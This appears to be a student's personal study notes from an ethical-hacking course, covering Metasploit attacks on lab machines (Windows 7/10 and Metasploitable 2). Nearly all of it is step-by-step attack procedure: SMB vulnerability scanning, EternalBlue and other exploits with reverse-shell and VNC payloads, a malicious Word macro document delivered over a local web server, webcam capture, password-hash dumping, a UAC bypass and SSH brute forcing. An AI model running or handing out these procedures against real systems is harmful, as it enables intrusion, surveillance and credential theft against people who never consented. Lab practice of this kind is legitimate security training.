2025-04-04 01:08

Status:

Tags:

# System Hacking

##  04/04/25

### System Hacking with Metasploit

**Metasploit** is a Framework used for developing and executing
exploit code against a remote target machine.

Metasploit Framework contains following modules
- Exploits
- Payloads
- Auxiliary
-  Post
-  Encoders
-  Nop's
- Evasion

- Components:
	- msfconsole
	- msfvenom
	- armitage

### Hacking windows 7 server using Metasploit 
(sir 7) (works only when firewall is off) (works on win 7,server)

- check host is live 

	- ping 10.10.10.8

- namp scan for port open (set 5 max i.e common 5 ports )
  
	- sudo namp -Pn -n 10.10.10.8 

- Target 445 port in windows 
	- smbmap -H 10.10.10.5 - it failed 

- So check for smbmap 
	- enum4linux -a 10.10.10.5 

- check for OS 
	- sudo nmap -p445 -Pn -n  -O 10.10.10.5 
			or
	- sudo nmap -p445 -Pn -n --script smb-os-discovery 10.10.10.8

- check version for smb use script 
	- locate *.nse | grep smb 
	- smb-protocols.nse
	- sudo nmap -p445 -Pn -n --script smb-protocols.nse 10.10.10.8

- check for vunlerbitlies  
	- /usr/share/nmap/scripts/smb-vuln-conficker.nse
	- /usr/share/nmap/scripts/smb-vuln-cve-2017-7494.nse
	- /usr/share/nmap/scripts/smb-vuln-cve2009-3103.nse
	- /usr/share/nmap/scripts/smb-vuln-ms06-025.nse
	- /usr/share/nmap/scripts/smb-vuln-ms07-029.nse
	- /usr/share/nmap/scripts/smb-vuln-ms08-067.nse
	- /usr/share/nmap/scripts/smb-vuln-ms10-054.nse
	- /usr/share/nmap/scripts/smb-vuln-ms10-061.nse
	- /usr/share/nmap/scripts/smb-vuln-ms17-010.nse
	- /usr/share/nmap/scripts/smb-vuln-regsvc-dos.nse
	- /usr/share/nmap/scripts/smb-vuln-webexec.nse

- combined vunlerbitlies scan for smb
	- sudo nmap -p445 -Pn -n --script smb-vuln-* 10.10.10.5 

### steps for running Metasploit
#### step: 1 Search for exploit and read exploit information
start 
	sudo service postgresql start
run
	msfconsole 
1. search for exploit and read information 
	- search ``<keyword>``
	- search ``<exploit><keyword>``
	- search type:exploit  smb
	- search type:exploit ms17-010
	- location of exploit 
		- cd /usr/share/metasploit-framework/modules/exploits/windows/smb 
		- exploit are not reliable - try it works then good 
2. Before using exploit get info about what it does 
	- info exploit/windows/smb/ms17_010_eternalblue
- Buffer-overflow (ek kava paysa tha)
1. Setting 
	- RHOSTS -Target's IP
	- RPORT - Target' port number 
	- LHOST -Attacker's IP
	- LPORT - Attacker's port 
#### step: 2 Load Exploit and configure exploit options
1. use ``<modulepath >``
2. show options 
3. set ``<option> <value>``
	-  set RHOSTS 10.10.10.5
- changed to Payload options 
	- set payload payload/windows/x64/shell/reverse_tcp
#### Step: 3 Load payload and configure payload option (optional) 
1. show payloads 
2.  set payload ``<payload path>`` 
3. set payload payload/windows/x64/shell_reverse_tcp 
4. set LHOST,RHOST,LPORT
##### Bind (shell) TCP Connection 
![None](https://miro.medium.com/v2/resize:fit:700/1*yjtQdNmE5NQyVgMVSM4eaw.png)

In a bind TCP connection, the target machine opens a port and waits for an incoming connection from the attacker. The attacker initiates the connection to the victim's open port. This method can be hindered by firewalls or NAT configurations, as they often block unsolicited incoming connections
##### Reverse (shell) TCP Connection (safe than Bind )

![An example of a reverse TCP shell.](https://www.researchgate.net/profile/Shafiq-Rehman-6/publication/335456696/figure/fig1/AS:806675057504258@1569337729909/An-example-of-a-reverse-TCP-shell.jpg)

In a reverse TCP connection, the target machine initiates a connection back to the attacker's machine. The attacker sets up a listener on their machine to receive this connection. This method is often more effective in bypassing firewalls and NAT, as outbound connections are typically allowed.



#### Step : 4 Exploit the target 
-  exploit
After getting access using shell 
- whoami
	- nt authority\system

To give massage alert in remote machine 
- msg * Hacked

Graphical access / remote access 
- show payloads
	- payload/windows/x64/vncinject/reverse_https
  - set payload payload/windows/x64/vncinject/reverse_https
  - exploit 
  - set viewonly false
  - tightvncconnect
  
install vlc clint for parrot 

sudo apt install tigervnc-viewer 
### Exploits 

Classified based on how the exploit communicate with the vulnerable software.


1.  **A Remote exploit:** works over a network and exploits the security vulnerability without any prior access to the vulnerable system.
2.  **A Local exploit:** requires prior access to the vulnerable system and escalate the privileges of the person running the exploit.
### Exploiting Meta2

#### Using port 21
1. search vsftpd 2.3.4
2. set payloads or use exploit/unix/ftp/vsftpd_234_backdoor
3. show options
4. set RHOST 10.10.10.6
5. exploit 
To connect shell
- shell
#### Using port 6667
1. search irc     UnrealIRCd
2. show options 
3. set LHOST 10.10.10.4
4. set RHOST 10.10.10.8
5. show payloads
6.  set payload payload/cmd/unix/reverse
7. exploit 

#### Using port 445 
1. use exploit/multi/samba/usermap_script
2. show targets
3. set target  ``< target-id >`` 0
4. show options
5. set LHOST 10.10.10.4
6. set RHOST 10.10.10.8
7. exploit 
#### Using port 1524 

1524/tcp open  bindshell   Metasploitable root shell

Connecting open port 
- natcat 
	- nc < listenerIP> ‹ListenerPort>
	- nc 10.10.10.6 1524

To open a port and start listening
- nc -lvp ``<port>``
- nc -lvp 5555
To check local port 
- netstat -antp


####  Using port 5432
1. use exploit/linux/postgres/postgres_payload
2. show options 
3. show target 
4. set target 0
5. set LHOST 10.10.10.4
6. set RHOST 10.10.10.6
7.  exploit 
####  Using port 1099
1. use exploit/linux/postgres/postgres_payload
2. 2. show options 
3. set LHOST 10.10.10.4
4. set RHOST 10.10.10.6
5.  exploit 
6. share http://10.10.10.4:8080/OhnIIQ
7. connect it 
 
- [x] DO it in windows 10 


# 07/04/25

Clint Side Attack

- Part 1 - Crate a malicious office word document
	- msfconsole -q
	- use exploit/muti/fileformat/office_word _macro
	- set FILENAME ``<file.doc/file.doc>``
- Part 2 - share the word document with the target 
	- LAN level attack 
	- cd /var/www/html/
	- mkdir  ``<dirname>``
	- cd  ``<dirname>``
	- mv ``</home/user/.msf4/local/file.docm>``
	- serivce appache2 start 
OR 
- Starting python server 
	- execution in this command  where file is located 
	- python3 -m http.server (defult port 8000)
	- starting in different port number 
	- python3 -m http.server ``<portnumber>``
- Part 3- start a listener on attacker's device 
	- use exploit/multi/handler
	- set payload windows/meterpreter/reverse_tcp
	- set LHOST ``<attacker ip>``
	- set LPORT ``<>attcker's port>``
	- exploit 

jobs for check listener 
- sessions 
 - sessions -i id(number)
To make sessions put in background 
- exit  
  - background 
  To get  back 
- sessions -i id(number)
  

#### For viewing the tcp/udp connections /processor checksing logs 
1. using netstat ( in terminal )
	- netstat -ano

2.  TCP view (GUI version of netsat )

3.  For detailed process monitor 
- process monitor v4 (procomod )

#### Getting shell using  metermeter Commands 
the word is main and the word is very hard to look 


- To run local target machine commands in meterpeter  
  lcd - change dir in 
  lpwd - show 

#### meterpeter Commands 

| commands   | function                 | Option | Examples           |
| ---------- | ------------------------ | ------ | ------------------ |
| download   | to downloads any thing   |        | download  filename |
| upload     | to upload                |        | upload filename    |
| screenshot | to take screenshot       |        | screenshot         |
| sysinfo    | gives System Information |        | sysinfo            |
| getuid     | gives username or id     |        |                    |
| getpid     | gives process id         |        |                    |
| getsystem  | to get privilege access  |        |                    |
| hashdump   | will dump user hashes    |        |                    |


#### Exploiting  windows 10 using videoCharge Studio 
- part 1 - install videoCharge Studio 2.12.3.685
- exploiting  videoCharge using Metasploit
	- msfconsole -q
	- search videocharge 
	- use exploit/windows/fileformat/videocharge_studio
	- set FILENAME ``XX.vsc``
	- set LHOST 
	- set LPORT  
- part 2 - share payload with target 
	- Starting python server 
		-  python3 -m http.server ``<portnumber>``
	- or 
	- Apache  server 
-  make target to download payload 
- part 3 - start a listener on attacker's device 
	- use exploit/multi/handler
	- set payload windows/meterpreter/reverse_tcp
	- set LHOST ``<attacker ip>``
	- set LPORT ``<>attcker's port>``
	- exploit 
- part 4 - accessing webcam
- webcam_list 
	- webcam_snap (picture)
	- webcam_stram (live)
- 
  
#### privilege Escalation -Bypasssing User Acess Control (UAC)
check if the curretn user is part of administrator group 
meterperter > shell
c:\> net user 
c:\> whoami
c:> net user `` <username >``
meterprter > background 
		  >search bypassuac 
		  
		  >use exploit/windows/local/bypassuac_fodhelper
		  >set SESSION <sessionid>
		  >exploit
		  >
- New meterpreter session will be opened
	- ps
	- migrate ``<pidofsystemprocess>``
	 - getsystem
#### Exploiting  meta2 using Metasploit ( ssh 22)
- step 1 - check host is live or not 
	- search ping sweep
	-  use auxiliary/scanner/discovery/arp_sweep
		- set RHOST ``<ip>``
		- run 
	- step 2 - port scan 
	- search port scan 
	- use auxiliary/scanner/portscan/syn
		- set RHOSTS ``<ip>``
		- set PORTS 21,22,80,443
		- run
- step 3 - version detection scan
	- search ssh version 
	- use_auxiliary/scanner/ssh/ssh_version
	- set RHOSTS ``<ip>``
	- run 
- step 4 -  brute force ssh using word list 
	- search ssh login 
	- use auxiliary/scanner/ssh/ssh login
	- set RHOSTS ``<ip>``
	- set USER_FILE ``<path>``
	- set PASS_FILE ``<path>``
	- unset USERNAME (to unset )


	sessions -i `<id >` (to intrace with sessions )
### References
 
